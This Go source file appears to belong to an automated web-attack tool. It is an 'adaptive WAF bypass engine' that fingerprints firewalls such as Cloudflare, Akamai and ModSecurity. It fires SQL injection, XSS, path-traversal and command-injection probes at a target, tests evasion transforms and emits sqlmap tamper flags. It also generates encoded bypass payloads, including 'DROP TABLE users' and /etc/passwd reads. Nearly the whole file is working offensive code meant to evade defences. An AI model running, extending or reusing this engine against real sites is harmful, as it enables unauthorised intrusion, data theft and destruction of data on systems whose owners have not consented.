// Package brain - Adaptive WAF Bypass Engine
// Real WAF fingerprinting + dynamic tamper selection + bypass effectiveness testing.
package brain

import (
"crypto/tls"
"fmt"
"io"
"math/rand"
"net/http"
"strings"
"sync"
"time"
)

// WAFVendor identifies the WAF protecting a target.
type WAFVendor string

const (
WAFCloudflare WAFVendor = "cloudflare"
WAFAkamai     WAFVendor = "akamai"
WAFImperva    WAFVendor = "imperva"
WAFSucuri     WAFVendor = "sucuri"
WAFModSec     WAFVendor = "modsecurity"
WAFBarracuda  WAFVendor = "barracuda"
WAFFortiWeb   WAFVendor = "fortiweb"
WAFUnknown    WAFVendor = "unknown"
WAFNone       WAFVendor = "none"
)

// WAFFingerprint holds detection results.
type WAFFingerprint struct {
Vendor      WAFVendor
Confidence  float64
BlockedOn   []string // which payloads triggered a block
Signals     []string // header/body signals that identified the WAF
BlockStatus int      // HTTP status used for blocking (403, 406, 429, etc.)
}

// TamperFunc transforms a payload to evade WAF detection.
type TamperFunc struct {
Name        string
Description string
Fn          func(string) string
Vendors     []WAFVendor // which WAFs this tamper is effective against
Tested      bool
Effective   bool
}

// BypassResult holds the result of a bypass attempt.
type BypassResult struct {
Tamper      string
Payload     string
Transformed string
Bypassed    bool
StatusCode  int
Evidence    string
}

var wafClient = &http.Client{
Timeout: 12 * time.Second,
Transport: &http.Transport{
TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
},
}

// ─── WAF Fingerprinting ───────────────────────────────────────────────────────

// FingerprintWAF sends probe requests and identifies the WAF vendor.
func FingerprintWAF(target string) WAFFingerprint {
fp := WAFFingerprint{Vendor: WAFNone, Confidence: 0.0}

if !strings.HasPrefix(target, "http") {
target = "https://" + target
}

// Step 1: Baseline request
baseResp, err := wafProbe(target, "/", "")
if err != nil {
return fp
}

// Step 2: Check headers for WAF signatures
fp.Signals = append(fp.Signals, detectFromHeaders(baseResp.headers)...)

// Step 3: Send attack probe to trigger WAF
attackProbes := []string{
"/?id=1' OR '1'='1",
"/?q=<script>alert(1)</script>",
"/?file=../../../etc/passwd",
"/?cmd=;ls",
"/?x=UNION SELECT 1,2,3--",
}

var blockedOn []string
var blockStatus int
for _, probe := range attackProbes {
resp, err := wafProbe(target, probe, "")
if err != nil {
continue
}
if resp.status == 403 || resp.status == 406 || resp.status == 429 || resp.status == 503 {
blockedOn = append(blockedOn, probe)
blockStatus = resp.status
fp.Signals = append(fp.Signals, detectFromHeaders(resp.headers)...)
fp.Signals = append(fp.Signals, detectFromBody(resp.body)...)
}
}

fp.BlockedOn = blockedOn
fp.BlockStatus = blockStatus

// Step 4: Identify vendor from signals
fp.Vendor, fp.Confidence = identifyVendor(fp.Signals, len(blockedOn))
return fp
}

func detectFromHeaders(headers map[string]string) []string {
var signals []string
checks := map[string]string{
"cf-ray":                    "cloudflare:header:cf-ray",
"cf-cache-status":           "cloudflare:header:cf-cache-status",
"x-akamai-transformed":      "akamai:header:x-akamai-transformed",
"x-akamai-request-id":       "akamai:header:x-akamai-request-id",
"x-iinfo":                   "imperva:header:x-iinfo",
"x-cdn":                     "imperva:header:x-cdn",
"x-sucuri-id":               "sucuri:header:x-sucuri-id",
"x-sucuri-cache":            "sucuri:header:x-sucuri-cache",
"x-fw-server":               "fortiweb:header:x-fw-server",
"x-barracuda-connect":       "barracuda:header:x-barracuda-connect",
}
for header, signal := range checks {
if _, ok := headers[strings.ToLower(header)]; ok {
signals = append(signals, signal)
}
}
return signals
}

func detectFromBody(body string) []string {
var signals []string
lower := strings.ToLower(body)
bodyChecks := map[string]string{
"cloudflare":                "cloudflare:body",
"attention required":        "cloudflare:body:attention",
"akamai":                    "akamai:body",
"incapsula":                 "imperva:body:incapsula",
"sucuri website firewall":   "sucuri:body",
"mod_security":              "modsecurity:body",
"barracuda":                 "barracuda:body",
"fortiweb":                  "fortiweb:body",
"access denied":             "generic:body:access-denied",
"request blocked":           "generic:body:blocked",
}
for pattern, signal := range bodyChecks {
if strings.Contains(lower, pattern) {
signals = append(signals, signal)
}
}
return signals
}

func identifyVendor(signals []string, blockedCount int) (WAFVendor, float64) {
counts := map[WAFVendor]int{}
for _, sig := range signals {
parts := strings.SplitN(sig, ":", 2)
if len(parts) > 0 {
vendor := WAFVendor(parts[0])
counts[vendor]++
}
}

var bestVendor WAFVendor = WAFUnknown
bestCount := 0
for vendor, count := range counts {
if count > bestCount {
bestCount = count
bestVendor = vendor
}
}

if blockedCount == 0 {
return WAFNone, 0.95
}

confidence := 0.0
switch bestCount {
case 0:
bestVendor = WAFUnknown
confidence = 0.40
case 1:
confidence = 0.60
case 2:
confidence = 0.80
default:
confidence = 0.95
}

return bestVendor, confidence
}

// ─── Tamper Library ───────────────────────────────────────────────────────────

// GetTampersForVendor returns tamper functions effective against a specific WAF.
func GetTampersForVendor(vendor WAFVendor) []TamperFunc {
all := allTampers()
if vendor == WAFNone || vendor == WAFUnknown {
return all
}

var matched []TamperFunc
for _, t := range all {
for _, v := range t.Vendors {
if v == vendor || v == WAFUnknown {
matched = append(matched, t)
break
}
}
}
if len(matched) == 0 {
return all
}
return matched
}

func allTampers() []TamperFunc {
return []TamperFunc{
{
Name:        "space2comment",
Description: "Replace spaces with /**/ comments",
Vendors:     []WAFVendor{WAFModSec, WAFImperva, WAFUnknown},
Fn:          func(p string) string { return strings.ReplaceAll(p, " ", "/**/") },
},
{
Name:        "space2plus",
Description: "Replace spaces with + signs",
Vendors:     []WAFVendor{WAFCloudflare, WAFAkamai, WAFUnknown},
Fn:          func(p string) string { return strings.ReplaceAll(p, " ", "+") },
},
{
Name:        "uppercase",
Description: "Uppercase SQL keywords",
Vendors:     []WAFVendor{WAFModSec, WAFUnknown},
Fn:          sqlUppercase,
},
{
Name:        "randomcase",
Description: "Random case SQL keywords",
Vendors:     []WAFVendor{WAFCloudflare, WAFImperva, WAFUnknown},
Fn:          randomCase,
},
{
Name:        "urlencode",
Description: "Double URL encode special chars",
Vendors:     []WAFVendor{WAFAkamai, WAFSucuri, WAFUnknown},
Fn:          doubleURLEncode,
},
{
Name:        "htmlencode",
Description: "HTML encode angle brackets",
Vendors:     []WAFVendor{WAFCloudflare, WAFUnknown},
Fn:          htmlEncode,
},
{
Name:        "between",
Description: "Use BETWEEN instead of > and <",
Vendors:     []WAFVendor{WAFModSec, WAFImperva, WAFUnknown},
Fn:          betweenTamper,
},
{
Name:        "charunicodeescape",
Description: "Unicode escape SQL chars",
Vendors:     []WAFVendor{WAFAkamai, WAFBarracuda, WAFUnknown},
Fn:          unicodeEscape,
},
{
Name:        "versionedcomment",
Description: "MySQL versioned comments /*!50000 ... */",
Vendors:     []WAFVendor{WAFModSec, WAFImperva, WAFUnknown},
Fn:          versionedComment,
},
{
Name:        "equaltolike",
Description: "Replace = with LIKE",
Vendors:     []WAFVendor{WAFCloudflare, WAFSucuri, WAFUnknown},
Fn:          func(p string) string { return strings.ReplaceAll(p, "=", " LIKE ") },
},
{
Name:        "chunkencoding",
Description: "Chunked transfer encoding bypass",
Vendors:     []WAFVendor{WAFAkamai, WAFImperva, WAFUnknown},
Fn:          func(p string) string { return p }, // applied at HTTP level
},
{
Name:        "nullbyte",
Description: "Insert null bytes between chars",
Vendors:     []WAFVendor{WAFModSec, WAFUnknown},
Fn:          nullByte,
},
// ── 2025 New Tampers ──────────────────────────────────────────────────
{
Name:        "space2tab",
Description: "Replace spaces with tab characters",
Vendors:     []WAFVendor{WAFCloudflare, WAFAkamai, WAFUnknown},
Fn:          func(p string) string { return strings.ReplaceAll(p, " ", "\t") },
},
{
Name:        "space2newline",
Description: "Replace spaces with newline+space (MySQL comment bypass)",
Vendors:     []WAFVendor{WAFModSec, WAFImperva, WAFUnknown},
Fn:          func(p string) string { return strings.ReplaceAll(p, " ", "\n") },
},
{
Name:        "hex2char",
Description: "Convert string literals to hex (0x41 = 'A')",
Vendors:     []WAFVendor{WAFCloudflare, WAFSucuri, WAFUnknown},
Fn:          hexEncode,
},
{
Name:        "concat2concatws",
Description: "Replace CONCAT with CONCAT_WS to bypass keyword filters",
Vendors:     []WAFVendor{WAFAkamai, WAFImperva, WAFUnknown},
Fn:          func(p string) string { return strings.ReplaceAll(p, "CONCAT(", "CONCAT_WS(0x20,") },
},
{
Name:        "ifnull2ifisnull",
Description: "Replace IFNULL with IF(ISNULL())",
Vendors:     []WAFVendor{WAFModSec, WAFUnknown},
Fn:          func(p string) string { return strings.ReplaceAll(p, "IFNULL(", "IF(ISNULL(") },
},
{
Name:        "xss_unicode",
Description: "Unicode escape XSS payloads",
Vendors:     []WAFVendor{WAFCloudflare, WAFAkamai, WAFUnknown},
Fn:          xssUnicodeEscape,
},
{
Name:        "xss_htmlentity",
Description: "HTML entity encode XSS angle brackets",
Vendors:     []WAFVendor{WAFImperva, WAFSucuri, WAFUnknown},
Fn:          xssHtmlEntity,
},
{
Name:        "xss_jsstring",
Description: "JS string escape for XSS in attribute context",
Vendors:     []WAFVendor{WAFCloudflare, WAFUnknown},
Fn:          xssJSString,
},
}
}

// ─── Bypass Testing ───────────────────────────────────────────────────────────

// TestBypassEffectiveness tests which tampers actually bypass the WAF.
// Returns ranked list of effective tampers.
func TestBypassEffectiveness(target, testPayload string, fp WAFFingerprint) []BypassResult {
tampers := GetTampersForVendor(fp.Vendor)
results := make([]BypassResult, 0, len(tampers))
var mu sync.Mutex
var wg sync.WaitGroup
sem := make(chan struct{}, 5)

for _, tamper := range tampers {
t := tamper
wg.Add(1)
sem <- struct{}{}
go func() {
defer wg.Done()
defer func() { <-sem }()

transformed := t.Fn(testPayload)
probe := "/?q=" + transformed
resp, err := wafProbe(target, probe, "")
if err != nil {
return
}

bypassed := resp.status != fp.BlockStatus && resp.status != 403 && resp.status != 406
result := BypassResult{
Tamper:      t.Name,
Payload:     testPayload,
Transformed: transformed,
Bypassed:    bypassed,
StatusCode:  resp.status,
Evidence:    fmt.Sprintf("HTTP %d (block=%d)", resp.status, fp.BlockStatus),
}

mu.Lock()
results = append(results, result)
mu.Unlock()
}()
}
wg.Wait()

// Sort: effective first
effective := []BypassResult{}
ineffective := []BypassResult{}
for _, r := range results {
if r.Bypassed {
effective = append(effective, r)
} else {
ineffective = append(ineffective, r)
}
}
return append(effective, ineffective...)
}

// BuildBypassedSQLMapArgs returns sqlmap --tamper flags for the detected WAF.
func BuildBypassedSQLMapArgs(fp WAFFingerprint, effectiveBypass []BypassResult) string {
var tampers []string

// Add vendor-specific tampers
switch fp.Vendor {
case WAFCloudflare:
tampers = append(tampers, "space2comment", "randomcase", "equaltolike")
case WAFAkamai:
tampers = append(tampers, "urlencode", "charunicodeescape", "space2plus")
case WAFImperva:
tampers = append(tampers, "space2comment", "between", "versionedcomment")
case WAFSucuri:
tampers = append(tampers, "urlencode", "equaltolike", "space2plus")
case WAFModSec:
tampers = append(tampers, "space2comment", "uppercase", "between", "versionedcomment")
default:
tampers = append(tampers, "space2comment", "randomcase", "urlencode")
}

// Add any tested-effective tampers
for _, r := range effectiveBypass {
if r.Bypassed {
found := false
for _, t := range tampers {
if t == r.Tamper {
found = true
break
}
}
if !found {
tampers = append(tampers, r.Tamper)
}
}
}

if len(tampers) == 0 {
return ""
}
return "--tamper=" + strings.Join(tampers, ",")
}

// FormatWAFReport returns a human-readable WAF analysis report.
func FormatWAFReport(fp WAFFingerprint, bypasses []BypassResult) string {
var sb strings.Builder
sb.WriteString(fmt.Sprintf("\n  WAF Analysis\n"))
sb.WriteString(fmt.Sprintf("  Vendor: %s (confidence: %.0f%%)\n", fp.Vendor, fp.Confidence*100))
sb.WriteString(fmt.Sprintf("  Block status: HTTP %d\n", fp.BlockStatus))
sb.WriteString(fmt.Sprintf("  Triggered by: %d/%d probes\n", len(fp.BlockedOn), 5))

if len(fp.Signals) > 0 {
sb.WriteString(fmt.Sprintf("  Signals: %s\n", strings.Join(fp.Signals[:wafMin(len(fp.Signals), 5)], ", ")))
}

effectiveCount := 0
for _, b := range bypasses {
if b.Bypassed {
effectiveCount++
}
}

sb.WriteString(fmt.Sprintf("\n  Bypass results: %d/%d tampers effective\n", effectiveCount, len(bypasses)))
for _, b := range bypasses {
if b.Bypassed {
sb.WriteString(fmt.Sprintf("  [BYPASS] %s -> HTTP %d\n", b.Tamper, b.StatusCode))
}
}

sqlmapArgs := BuildBypassedSQLMapArgs(fp, bypasses)
if sqlmapArgs != "" {
sb.WriteString(fmt.Sprintf("\n  Recommended sqlmap args: %s\n", sqlmapArgs))
}

return sb.String()
}

// ─── HTTP probe helper ────────────────────────────────────────────────────────

type wafProbeResp struct {
status  int
headers map[string]string
body    string
}

func wafProbe(base, path, body string) (wafProbeResp, error) {
url := strings.TrimRight(base, "/") + path
req, err := http.NewRequest("GET", url, nil)
if err != nil {
return wafProbeResp{}, err
}
req.Header.Set("User-Agent", randomUA())
req.Header.Set("Accept", "text/html,application/xhtml+xml,*/*")

resp, err := wafClient.Do(req)
if err != nil {
return wafProbeResp{}, err
}
defer resp.Body.Close()

bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
headers := map[string]string{}
for k, v := range resp.Header {
if len(v) > 0 {
headers[strings.ToLower(k)] = v[0]
}
}

return wafProbeResp{
status:  resp.StatusCode,
headers: headers,
body:    string(bodyBytes),
}, nil
}

// ─── Tamper implementations ───────────────────────────────────────────────────

func sqlUppercase(p string) string {
keywords := []string{"select", "union", "from", "where", "and", "or", "insert", "update", "delete", "drop", "table", "order", "by", "having", "group"}
result := p
for _, kw := range keywords {
result = strings.ReplaceAll(result, kw, strings.ToUpper(kw))
}
return result
}

func randomCase(p string) string {
var sb strings.Builder
for i, c := range p {
if i%2 == 0 {
sb.WriteString(strings.ToUpper(string(c)))
} else {
sb.WriteString(strings.ToLower(string(c)))
}
}
return sb.String()
}

func doubleURLEncode(p string) string {
replacer := strings.NewReplacer(
"'", "%2527",
"\"", "%2522",
"<", "%253C",
">", "%253E",
" ", "%2520",
"=", "%253D",
)
return replacer.Replace(p)
}

func htmlEncode(p string) string {
replacer := strings.NewReplacer(
"<", "&lt;",
">", "&gt;",
"\"", "&quot;",
"'", "&#x27;",
)
return replacer.Replace(p)
}

func betweenTamper(p string) string {
return strings.ReplaceAll(p, ">", " BETWEEN 1 AND ")
}

func unicodeEscape(p string) string {
var sb strings.Builder
for _, c := range p {
if c > 127 || c == '\'' || c == '"' || c == '<' || c == '>' {
sb.WriteString(fmt.Sprintf("\\u%04X", c))
} else {
sb.WriteRune(c)
}
}
return sb.String()
}

func versionedComment(p string) string {
keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR"}
result := p
for _, kw := range keywords {
result = strings.ReplaceAll(result, kw, "/*!50000"+kw+"*/")
}
return result
}

func nullByte(p string) string {
var sb strings.Builder
for i, c := range p {
sb.WriteRune(c)
if i%3 == 0 && i > 0 {
sb.WriteString("%00")
}
}
return sb.String()
}

var userAgents = []string{
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
}

func randomUA() string {
return userAgents[rand.Intn(len(userAgents))]
}

func wafMin(a, b int) int {
if a < b {
return a
}
return b
}


// ─── 2025 New Tamper Implementations ─────────────────────────────────────────

func hexEncode(p string) string {
	var sb strings.Builder
	for _, c := range p {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') {
			sb.WriteString(fmt.Sprintf("0x%X", c))
		} else {
			sb.WriteRune(c)
		}
	}
	return sb.String()
}

func xssUnicodeEscape(p string) string {
	replacer := strings.NewReplacer(
		"<", `\u003c`,
		">", `\u003e`,
		"'", `\u0027`,
		"\"", `\u0022`,
		"/", `\u002f`,
	)
	return replacer.Replace(p)
}

func xssHtmlEntity(p string) string {
	replacer := strings.NewReplacer(
		"<", "&#60;",
		">", "&#62;",
		"'", "&#39;",
		"\"", "&#34;",
		"(", "&#40;",
		")", "&#41;",
	)
	return replacer.Replace(p)
}

func xssJSString(p string) string {
	replacer := strings.NewReplacer(
		"<", `\x3c`,
		">", `\x3e`,
		"'", `\'`,
		"\"", `\"`,
		"\n", `\n`,
		"\r", `\r`,
	)
	return replacer.Replace(p)
}

// GetBypassPayloadsForVuln returns WAF-bypassed payloads for a specific vuln type.
// Used by hunt/abhimanyu to automatically apply bypass when WAF is detected.
func GetBypassPayloadsForVuln(vulnType string, vendor WAFVendor) []string {
	tampers := GetTampersForVendor(vendor)

	basePayloads := map[string][]string{
		"xss": {
			`<script>alert(1)</script>`,
			`<img src=x onerror=alert(1)>`,
			`<svg onload=alert(1)>`,
			`javascript:alert(1)`,
			`"><script>alert(1)</script>`,
		},
		"sqli": {
			`' OR '1'='1`,
			`' UNION SELECT 1,2,3--`,
			`1; DROP TABLE users--`,
			`' AND SLEEP(5)--`,
			`1' ORDER BY 1--`,
		},
		"ssti": {
			`{{7*7}}`,
			`${7*7}`,
			`<%= 7*7 %>`,
			`#{7*7}`,
			`*{7*7}`,
		},
		"lfi": {
			`../../../etc/passwd`,
			`....//....//....//etc/passwd`,
			`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
		},
	}

	base, ok := basePayloads[strings.ToLower(vulnType)]
	if !ok {
		return nil
	}

	var result []string
	result = append(result, base...) // always include originals

	// Apply each tamper to each base payload
	for _, tamper := range tampers[:wafMin(len(tampers), 5)] {
		for _, payload := range base {
			transformed := tamper.Fn(payload)
			if transformed != payload {
				result = append(result, transformed)
			}
		}
	}

	return result
}
